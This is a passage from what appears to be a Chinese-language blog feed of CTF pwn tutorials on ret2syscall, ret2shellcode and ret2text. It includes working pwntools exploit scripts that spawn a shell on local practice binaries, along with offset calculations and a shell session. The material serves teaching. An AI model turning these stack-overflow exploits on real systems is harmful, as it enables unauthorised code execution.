class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">                             +-----------------+</span><br><span class="line">                             |   int_0x80      | </span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |    <span class="string">&#x27;bin/sh&#x27;</span>     |</span><br><span class="line">                             +-----------------|                 </span><br><span class="line">                             |        0        |</span><br><span class="line">                             +-----------------|                 </span><br><span class="line">                             |        0        |</span><br><span class="line">                             +-----------------+                 </span><br><span class="line">                             |  pop_other_ret  |</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |       0xb       |  </span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |   pop_eax_ret   | </span><br><span class="line">                      ebp---&gt;+-----------------+</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             +-----------------+                 </span><br><span class="line">                             |        v4       |</span><br><span class="line">            v4起始,ebp-0x6C--&gt;+-----------------+  </span><br><span class="line"><span class="comment"># pop_other_ret = pop_edx_ecx_ebx_ret，传参顺序为edx--&gt;ecx--&gt;ebx</span></span><br><span class="line"><span class="comment"># 调用了gets()函数，待会要返回main()，故pop_eax_ret前有个新的ebp，要填充4字节覆盖。而其他的pop_ret只是gadget，不用在其前面加ebp来填充4字节</span></span><br><span class="line"><span class="comment"># 由于ROP是连续的gadget，故视图如上</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#写法1</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">bin_sh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, bin_sh, int_0x80])</span><br><span class="line"><span class="comment">#flat模块能将pattern字符串和地址结合并且转为字节模式</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#写法2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">int_0x80=<span class="number">0x8049421</span></span><br><span class="line">bin_sh=<span class="number">0x80be408</span></span><br><span class="line">pop_other_ret=<span class="number">0x806eb90</span></span><br><span class="line">pop_eax_ret=<span class="number">0x80bb196</span></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_other_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>填充多少个字符这里不多赘述，可以看<strong>ret2text</strong></p>]]></content>
      
      
      <categories>
          
          <category> 玩转PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2shellcode</title>
      <link href="/2022/12/02/5-ret2shellcode/"/>
      <url>/2022/12/02/5-ret2shellcode/</url>
      
        <content type="html"><![CDATA[<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>在栈溢出的攻击技术中通常是要控制函数的返回地址到自己想要的地方执行自己想要执行的代码。ret2shellcode代表返回到shellcode中即控制函数的返回地址到预先设定好的shellcode区域中去执行shellcode代码，这是非常危险的。</p><h3 id="step1-32bit-or-64bit"><a href="#step1-32bit-or-64bit" class="headerlink" title="step1 32bit or 64bit?"></a>step1 32bit or 64bit?</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：file &lt;.ELF&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROP$ file ret2shellcode </span><br><span class="line">ret2shellcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=47e6d638fe0f3a3ff4695edb8b6c7e83461df949, with debug_info, not stripped</span><br><span class="line">ROP$ gdb ./ret2shellcode</span><br></pre></td></tr></table></figure><h3 id="step2-checksec"><a href="#step2-checksec" class="headerlink" title="step2 checksec"></a>step2 checksec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：checksec &lt;.ELF&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROP$ checksec ret2shellcode</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/题目/ROP/ret2shellcode&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><h3 id="step3-IDA32"><a href="#step3-IDA32" class="headerlink" title="step3 IDA32"></a>step3 IDA32</h3><p>打开即主函数main()，直接F5反汇编，伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nt __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);<span class="comment">//危险函数</span></span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64</span>u);                  <span class="comment">//0x64u为无符号十六进制64   </span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gets()并没有对其输入长度做限制，因此存在溢出，且将输入的值复制到了buf2的内存空间里，点击buf2，进行跳转，发现buf2在.bss段内的空间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A064                                         ; __do_global_dtors_aux+14↑w</span><br><span class="line">.bss:0804A065                 align 20h</span><br><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br><span class="line">.bss:0804A080</span><br><span class="line">.prgend:0804A0E4 ; ===========================================================================</span><br><span class="line">.prgend:0804A0E4</span><br><span class="line">.prgend:0804A0E4 ; Segment type: Zero-length</span><br><span class="line">.prgend:0804A0E4 _prgend         segment byte public &#x27;&#x27; use32</span><br><span class="line">.prgend:0804A0E4 _end            label byte</span><br><span class="line">.prgend:0804A0E4 _prgend         ends</span><br><span class="line">.prgend:0804A0E4</span><br></pre></td></tr></table></figure><h3 id="step4-查看-bss段"><a href="#step4-查看-bss段" class="headerlink" title="step4 查看.bss段"></a>step4 查看.bss段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">process：gdb ret2shellcode--&gt;b main--&gt;r(run)--&gt;vmmap</span><br></pre></td></tr></table></figure><p>通过 vmmap，查看.bss 段对应的段具有可执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">0x8048000  0x8049000 r-xp     1000 0      /home/pwn/桌面/题目/ROP/ret2shellcode</span><br><span class="line">0x8049000  0x804a000 r-xp     1000 0      /home/pwn/桌面/题目/ROP/ret2shellcode</span><br><span class="line">0x804a000  0x804b000 rwxp     1000 1000   /home/pwn/桌面/题目/ROP/ret2shellcode</span><br><span class="line">0xf7dcb000 0xf7fb3000 r-xp   1e8000 0      /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fb3000 0xf7fb5000 r-xp     2000 1e7000 /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fb5000 0xf7fb7000 rwxp     2000 1e9000 /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fb7000 0xf7fb9000 rwxp     2000 0      </span><br><span class="line">0xf7fcb000 0xf7fcd000 rwxp     2000 0      </span><br><span class="line">0xf7fcd000 0xf7fd0000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd0000 0xf7fd1000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd1000 0xf7ffb000 r-xp    2a000 0      /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 2a000  /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 2b000  /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br></pre></td></tr></table></figure><p>所以把只要把内容写到以下这个地方，然后返回地址跳转到 bss 段就可以执行 shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x804a000  0x804b000 rwxp     1000 1000   /home/pwn/桌面/题目/ROP/ret2shellcode</span><br></pre></td></tr></table></figure><h3 id="step5-padding"><a href="#step5-padding" class="headerlink" title="step5 padding"></a>step5 padding</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">生成字符：cyclic 150</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">桌面$ cyclic 150</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma</span><br></pre></td></tr></table></figure><p>退出gdb，重新进入，填充字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; q</span><br><span class="line">ROP$ gdb ./ret2shellcode</span><br><span class="line">GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type <span class="string">&quot;show copying&quot;</span> and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">pwndbg: loaded 192 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/break)</span><br><span class="line">Reading symbols from ./ret2shellcode...</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/pwn/桌面/题目/ROP/ret2shellcode </span><br><span class="line">No system <span class="keyword">for</span> you this time !!!</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma</span><br><span class="line"><span class="built_in">bye</span> <span class="built_in">bye</span> ~</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x62616164 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure><p>！！！关键信息 报错地址：0x62616164</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x62616164 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure><h3 id="step6-计算stack空间大小"><a href="#step6-计算stack空间大小" class="headerlink" title="step6 计算stack空间大小"></a>step6 计算stack空间大小</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：cyclic -l 0x62616164</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">桌面$ cyclic -l 0x62616164</span><br><span class="line">112</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">                             +-----------------+</span><br><span class="line">                             |    buf2_addr    |  原ret返回位置</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |   Caller<span class="string">&#x27;s ebp  | 原saved ebp位置（4字节）</span></span><br><span class="line"><span class="string">                      ebp---&gt;+-----------------+</span></span><br><span class="line"><span class="string">                             |                 |</span></span><br><span class="line"><span class="string">                             |                 |</span></span><br><span class="line"><span class="string">                             |                 |</span></span><br><span class="line"><span class="string">                             |                 |</span></span><br><span class="line"><span class="string">                             +-----------------+                 </span></span><br><span class="line"><span class="string">                             |        s        |</span></span><br><span class="line"><span class="string">             s起始,ebp-0x6C--&gt;+-----------------+</span></span><br><span class="line"><span class="string"># 这里的s的值存放着shellcode和一些垃圾数据，而不是单纯的垃圾数据，里面含有控制程序流的数据，因为后面有</span></span><br><span class="line"><span class="string"># strcpy函数要将s复制到buf里，而我们返回地址便是buf2_addr，这样我们的返回地址就含有shellcode，</span></span><br><span class="line"><span class="string"># shellcode.ljust(112,&#x27;</span>a<span class="string">&#x27;) 就是先填充shellcode，再填充字符&#x27;</span>a<span class="string">&#x27;，故返回地址buf2_addr就先填充</span></span><br><span class="line"><span class="string"># shellcode来控制程序执行流          </span></span><br></pre></td></tr></table></figure><h3 id="step7-exp"><a href="#step7-exp" class="headerlink" title="step7 exp"></a>step7 exp</h3><p>shellcraft.sh()是自带的一段shellcode，可以自己写，也可以去这里找，然后通过ljust方法左对齐填充字节，直到溢出到返回地址，buf2_addr即是可执行shellcode的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(shellcraft.sh())//<span class="built_in">print</span>语句可去掉</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span>//buf2地址</span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(buf2_addr))//要在<span class="string">&#x27;A&#x27;</span>前面加b</span><br><span class="line"><span class="built_in">print</span>(shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>))//要在<span class="string">&#x27;A&#x27;</span>前面加b</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>shellcode.ljust(112,’a’) 可以控制垃圾数据与 shellcode 合起来的长度为112，上面是给出的 exp 等价于下面的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode += <span class="string">&#x27;A&#x27;</span>*(<span class="number">112</span>-<span class="built_in">len</span>(shellcode))</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">sh.sendline(shellcode + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="step8-pwn"><a href="#step8-pwn" class="headerlink" title="step8 pwn"></a>step8 pwn</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试命令：</span><br><span class="line">whoami  </span><br><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ROP$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2shellcode&#x27;</span>: pid 2310</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">No system <span class="keyword">for</span> you this time !!!</span><br><span class="line"><span class="built_in">bye</span> <span class="built_in">bye</span> </span><br><span class="line">~$ <span class="built_in">whoami</span></span><br><span class="line">pwn</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">core    ret2libc1  ret2libc3      ret2syscall  tools</span><br><span class="line">exp.py    ret2libc2  ret2shellcode  ret2text</span><br></pre></td></tr></table></figure><p>最后pwn完，可以Ctrl+C退出shell</p><h2 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h2><p>step3中显示字符数组s距离ebp为0x64字节（即100字节），此处为静态分析，可能存在不准确，故要进行动态调试分析，如果直接使用step5和step6则可直接得出填充长度，可不用动态分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br></pre></td></tr></table></figure><p>这里我们动态分析下，依旧先调试三连，n执行下去，当执行到下面时，再next，会让我们输入数据，我们随便输几个字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x8048570</span> &lt;main+<span class="number">67</span>&gt;     mov    dword ptr [esp + <span class="number">4</span>], <span class="number">0</span></span><br><span class="line">  <span class="number">0x8048578</span> &lt;main+<span class="number">75</span>&gt;     mov    dword ptr [esp], eax</span><br><span class="line">  <span class="number">0x804857b</span> &lt;main+<span class="number">78</span>&gt;     call   setvbuf@plt &lt;setvbuf@plt&gt;</span><br><span class="line"></span><br><span class="line">  <span class="number">0x8048580</span> &lt;main+<span class="number">83</span>&gt;     mov    dword ptr [esp], <span class="number">0x8048660</span></span><br><span class="line">  <span class="number">0x8048587</span> &lt;main+<span class="number">90</span>&gt;     call   <span class="built_in">puts</span>@plt &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line"></span><br><span class="line">► <span class="number">0x804858c</span> &lt;main+<span class="number">95</span>&gt;     lea    eax, [esp + <span class="number">0x1c</span>]</span><br><span class="line">  <span class="number">0x8048590</span> &lt;main+<span class="number">99</span>&gt;     mov    dword ptr [esp], eax</span><br><span class="line">  <span class="number">0x8048593</span> &lt;main+<span class="number">102</span>&gt;    call   gets@plt &lt;gets@plt&gt;</span><br><span class="line"></span><br><span class="line">  <span class="number">0x8048598</span> &lt;main+<span class="number">107</span>&gt;    mov    dword ptr [esp + <span class="number">8</span>], <span class="number">0x64</span></span><br><span class="line">  <span class="number">0x80485a0</span> &lt;main+<span class="number">115</span>&gt;    lea    eax, [esp + <span class="number">0x1c</span>]</span><br><span class="line">  <span class="number">0x80485a4</span> &lt;main+<span class="number">119</span>&gt;    mov    dword ptr [esp + <span class="number">4</span>], eax</span><br></pre></td></tr></table></figure><p>stack命令尽量大点，可用stack 50，能观察到ebp与字符填充的距离即可（说明：‘aaaa’有两个，通常地址指向的即为其所存放的值，如果有双箭头，比如ESP的地址为<strong>0xffffd0f0</strong>，存放的是指针<strong>0xffffd10c</strong>，而这个指针又存放着‘aaaa’，故真实存放‘aaaa’的地址是<strong>0xffffd10c</strong>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffffd0f0</span> —▸ <span class="number">0xffffd10c</span> ◂— <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│      <span class="number">0xffffd0f4</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│      <span class="number">0xffffd0f8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│      <span class="number">0xffffd0fc</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│      <span class="number">0xffffd108</span> —▸ <span class="number">0xf7ffd000</span> ◂— and    al, <span class="number">0xbf</span> <span class="comment">/* 0x2bf24 */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│ eax  <span class="number">0xffffd10c</span> ◂— <span class="string">&#x27;aaaa&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202213719919.png" alt="image-20221202213719919"></p><p>计算相对偏移地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p 0x88 - 0x1c</span><br><span class="line">$1 = 108</span><br></pre></td></tr></table></figure><p><strong>可以得出gdb动态分析和ida静态分析结果不同，s与ebp距离不同</strong></p>]]></content>
      
      
      <categories>
          
          <category> 玩转PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>超简单的Stack Overflow</title>
      <link href="/2022/12/02/4-ret2text/"/>
      <url>/2022/12/02/4-ret2text/</url>
      
        <content type="html"><![CDATA[<h1 id="超简单的Stack-Overflow"><a href="#超简单的Stack-Overflow" class="headerlink" title="超简单的Stack Overflow"></a>超简单的Stack Overflow</h1><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反编译伪代码</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Have you heard of buffer overflow?&quot;</span>);</span><br><span class="line">  vulnerable(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It seems that you know nothing about it ......&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//双击vulnerable，进入vulnerable函数，发现gets()，调试时可以在此输入数据</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由[ebp-10h]可以知道此处距离ebp为0x10个字节，后面用gdb调试说明</p><h2 id="pwndbg"><a href="#pwndbg" class="headerlink" 